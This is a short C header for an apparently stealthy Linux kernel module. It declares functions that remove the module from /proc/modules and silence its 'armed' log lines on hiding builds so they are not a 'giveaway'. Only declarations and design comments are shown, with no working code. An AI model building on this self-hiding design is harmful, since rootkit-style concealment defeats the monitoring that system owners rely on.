#ifndef _NM_HIDE_H
#define _NM_HIDE_H

#include <linux/types.h>
#include <linux/compiler.h>

void nm_module_hide(void);

/* True when this build will take itself out of /proc/modules. The guards use it
 * to decide whether saying "armed" in the kernel log is a diagnostic or a
 * giveaway - see nm_say() in nm_hide.c. */
bool nm_hiding(void);

/* pr_info() that keeps quiet on a hiding build. For the routine "this arm is
 * up" lines only: a WARNING means something is wrong and is always printed,
 * because a user with a half-armed cloak has to be able to find out why. */
void nm_say(const char *fmt, ...) __printf(1, 2);

#endif
